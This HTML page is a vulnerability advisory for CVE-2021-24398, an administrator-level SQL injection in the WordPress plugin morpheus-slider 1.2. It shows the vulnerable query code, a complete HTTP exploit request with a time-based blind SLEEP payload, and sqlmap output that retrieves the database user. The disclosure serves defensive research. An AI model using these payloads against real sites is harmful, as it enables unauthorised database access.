<!DOCTYPE html>
<html lang="en-us">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
      <title>wp-plugin : morpheus-slider | Code Vigilant : to err is human.. To fix is Humanity</title>
    
    <link rel="stylesheet" href="/css/style.css" />
    <link rel="stylesheet" href="/css/fonts.css" />
    
  </head>

  <body>
<a href="https://codevigilant.com"><img src="/banner.png" class="header-image" width="508" height="111" alt=""  /></a>

<nav class="menu">
	<ul class="menu__list">
		<li class="menu__item">
			<a class="menu__link" href="/" >
				
				<span class="menu__text">Home</span>
				
			</a>
		</li>
		<li class="menu__item menu__dropdown">
			<a class="menu__link" href="/disclosure/">
				
				<span class="menu__text">Disclosure</span>

				
			</a>
			<input type="checkbox" id="Disclosure">
			<ul class="submenu__list">
				
					<li class="menu__item">
					<a class="menu__link" href="/category/injection/">
						
						<span class="menu__text">INJECTION</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/cross-site-scripting-xss/">
						
						<span class="menu__text">CROSS-SITE SCRIPTING (XSS)</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/information-disclosure/">
						
						<span class="menu__text">INFORMATION DISCLOSURE</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/local-file-inclusion/">
						
						<span class="menu__text">LOCAL FILE INCLUSION</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/ssrf/">
						
						<span class="menu__text">SSRF/XSPA</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/components-with-known-vulnerabilities/">
						
						<span class="menu__text">COMPONENTS WITH KNOWN VULNERABILITIES</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/unvalidated-redirects-and-forwards/">
						
						<span class="menu__text">UNVALIDATED REDIRECTS AND FORWARDS</span>
						
					</a>
					</li>
				
			</ul>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/blog/" >
				
				<span class="menu__text">Blog</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/feed.xml" >
				
				<span class="menu__text">RSS Feed</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/about-team/" >
				
				<span class="menu__text">About Team</span>
				
			</a>
		</li>
	</ul>
</nav>



<main>
	<br />
<center><a href=""><span class="title">Wp Plugin Morpheus Slider</span></a></center>

<h3><u>Plugin Details</u></h3><div>Plugin Name: <a href="https://wordpress.org/plugins/morpheus-slider/" rel="noreferrer noopener nofollow" target="_blank">wp-plugin : morpheus-slider</a></div>
<div>Effected Version : 1.2 (and most probably lower version's if any)</div>
<div>Vulnerability : <a href="/category/injection/">Injection</a></div>
<div>Minimum Level of Access Required : Administrator</div>
<div>CVE Number : CVE-2021-24398</div>
<div>Identified by : <a href="/author/syed_sheeraz_ali/">Syed Sheeraz Ali</a></div>
<div><a href="https://wpscan.com/plugin/morpheus-slider/" rel="noreferrer noopener nofollow" target="_blank">WPScan Reference URL</a></div>
 
<h3><u>Disclosure Timeline</u></h3>
<ul>
	<li>

<div>May 9, 2021: Issue Identified and Disclosed to WPScan</div>

	</li>
	
	<li>
	May 13, 2021 : Plugin  Closed</li>
	
	
	<li>June 10, 2021 : CVE Assigned</li>
	
	<li>August 22, 2021 : Public Disclosure</li>
</ul>



<h3><u>Technical Details</u></h3>

<h2 id="details">Details</h2>
<p>Vulnerable File: <code>/init.php#983</code></p>
<p>Vulnerable Code block and parameter:</p>
<p>Administrator level SQLi for parameter <code>id</code> <a href="https://plugins.trac.wordpress.org/browser/morpheus-slider/trunk/init.php#983" target="_blank" rel="noreferrer noopener nofollow">init.php#983</a>
</p>
<pre><code>983:	$myrows = $wpdb-&gt;get_results( &quot;SELECT * FROM $table_name WHERE id = &quot;.$_POST['id'] );
--------------------------------------------------------------------------------
1211:		$myrows = $wpdb-&gt;get_results( &quot;SELECT * FROM $table_name WHERE id = &quot;.$_POST['id'] );
</code></pre><h2 id="poc-screenshots">PoC Screenshots</h2>
<p><img src="/disclosure_screenshots/morpheus-slider_screenshot1.png" alt="screenshot 1">
<img src="/disclosure_screenshots/morpheus-slider_screenshot2.png" alt="screenshot 2">
<img src="/disclosure_screenshots/morpheus-slider_screenshot3.png" alt="screenshot 3"></p>
<h4 id="exploit">Exploit</h4>
<pre><code>POST /wp-admin/options-general.php?page=morpheus HTTP/1.1
Host: 172.28.128.50
Content-Length: 1042
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://172.28.128.50
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-GPC: 1
Referer: http://172.28.128.50/wp-admin/options-general.php?page=morpheus
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: wordpress_232395f24f6cff47569f2739c21385d6=admin%7C1620460502%7CijOCmlgmjMgoJK3UsTwIOiXIcfoc1SikqZGRE8FZzNF%7C3d7d033b8daf07dedf1e1a8dcd76b6e1e0dcbafe4aaccb82e6746a6aca1573ac; wordpress_test_cookie=WP%20Cookie%20check; tk_ai=woo%3AiQVT6EvbuCedvp65Wb1%2BuUEl; PHPSESSID=d8f8beced189cdd7cb849dedbb8a8383; wordpress_logged_in_232395f24f6cff47569f2739c21385d6=admin%7C1620460502%7CijOCmlgmjMgoJK3UsTwIOiXIcfoc1SikqZGRE8FZzNF%7C7592628b1a41de06805c47e90606ccc7b50c0188ae4783aef3d87442aa29d6f5; wp-settings-time-1=1620304946
Connection: close

operation=0&amp;itemselect4=&amp;order1=1&amp;title1=New scene&amp;image1=&amp;timage1=&amp;video1=&amp;beffect1=2&amp;xeffect1=&amp;colorc1=easeInOutElastic&amp;colorb1=FFFFFF&amp;total=1&amp;stitle4=New slider&amp;width4=1200&amp;height4=600&amp;border4=10000&amp;op44=1000&amp;color34=4&amp;op114=0&amp;op64=FFFFFF&amp;op74=B5B5B5&amp;op124=5&amp;op84=50&amp;op104=50&amp;op24=50&amp;op54=50&amp;op14=1&amp;number_thumbnails4=4&amp;op34=10&amp;round4=60&amp;op154=000000&amp;op94=FFFFFF&amp;theight4=16&amp;twidth4=5&amp;sizetitle4=true&amp;op134=000000&amp;tborder4=FFFFFF&amp;op144=1&amp;font4=2&amp;color14=000000&amp;color24=0.5&amp;thumbnail_round4=_self&amp;e0=swirlFadeOutRotateFancy&amp;or0=0&amp;e1=slideDown&amp;or1=1&amp;e2=swirlFadeOutRotate&amp;or2=2&amp;e3=fade&amp;or3=3&amp;e4=boxFadeOutOriginalRotate&amp;or4=4&amp;e5=slideUp&amp;or5=5&amp;or6=6&amp;or7=7&amp;or8=8&amp;or9=9&amp;or10=10&amp;or11=11&amp;or12=12&amp;or13=13&amp;or14=14&amp;or15=15&amp;or16=16&amp;or17=17&amp;or18=18&amp;or19=19&amp;or20=20&amp;or21=21&amp;or22=22&amp;or23=23&amp;or24=24&amp;or25=25&amp;or26=26&amp;or27=27&amp;or28=28&amp;or29=29&amp;or30=30&amp;or31=31&amp;or32=32&amp;or33=33&amp;or34=34&amp;or35=35&amp;or36=36&amp;or37=37&amp;or38=38&amp;or39=39&amp;or40=40&amp;or41=41&amp;or42=42&amp;or43=43&amp;or44=44&amp;or45=45&amp;or46=46&amp;or47=47&amp;id=4 AND (SELECT 4576 FROM (SELECT(SLEEP(5)))QuMl)&amp;submit=Save Changes
</code></pre><pre><code>sqlmap identified the following injection point(s) with a total of 336 HTTP(s) requests:
---
Parameter: id (POST)
    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: operation=1&amp;itemselect1=&amp;total=-1&amp;stitle1=New slider&amp;width1=1200&amp;height1=600&amp;border1=10000&amp;op41=1000&amp;color31=4&amp;op111=0&amp;op61=FFFFFF&amp;op71=B5B5B5&amp;op121=5&amp;op81=50&amp;op101=50&amp;op21=50&amp;op51=50&amp;op11=1&amp;number_thumbnails1=4&amp;op31=10&amp;round1=60&amp;op151=000000&amp;op91=FFFFFF&amp;theight1=16&amp;twidth1=5&amp;sizetitle1=true&amp;op131=000000&amp;tborder1=FFFFFF&amp;op141=1&amp;font1=2&amp;color11=000000&amp;color21=0.5&amp;thumbnail_round1=_self&amp;e0=swirlFadeOutRotateFancy&amp;or0=0&amp;e1=slideDown&amp;or1=1&amp;e2=swirlFadeOutRotate&amp;or2=2&amp;e3=fade&amp;or3=3&amp;e4=boxFadeOutOriginalRotate&amp;or4=4&amp;e5=slideUp&amp;or5=5&amp;or6=6&amp;or7=7&amp;or8=8&amp;or9=9&amp;or10=10&amp;or11=11&amp;or12=12&amp;or13=13&amp;or14=14&amp;or15=15&amp;or16=16&amp;or17=17&amp;or18=18&amp;or19=19&amp;or20=20&amp;or21=21&amp;or22=22&amp;or23=23&amp;or24=24&amp;or25=25&amp;or26=26&amp;or27=27&amp;or28=28&amp;or29=29&amp;or30=30&amp;or31=31&amp;or32=32&amp;or33=33&amp;or34=34&amp;or35=35&amp;or36=36&amp;or37=37&amp;or38=38&amp;or39=39&amp;or40=40&amp;or41=41&amp;or42=42&amp;or43=43&amp;or44=44&amp;or45=45&amp;or46=46&amp;or47=47&amp;id=1 AND (SELECT 6603 FROM (SELECT(SLEEP(5)))Xphv)
---
[18:16:40] [INFO] the back-end DBMS is MySQL
[18:16:40] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL &gt;= 5.0.12
[18:16:40] [INFO] fetching current user
[18:16:40] [INFO] retrieved:
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[18:17:10] [INFO] adjusting time delay to 1 second due to good response times
bob@localhost
current user: 'bob@localhost'
</code></pre>

<br />


</main>

  <footer>
  
  
  <hr/>
  Â© <a href="https://anantshri.info">Anant Shrivastava</a> 2021
  
  </footer>
  </body>
</html>

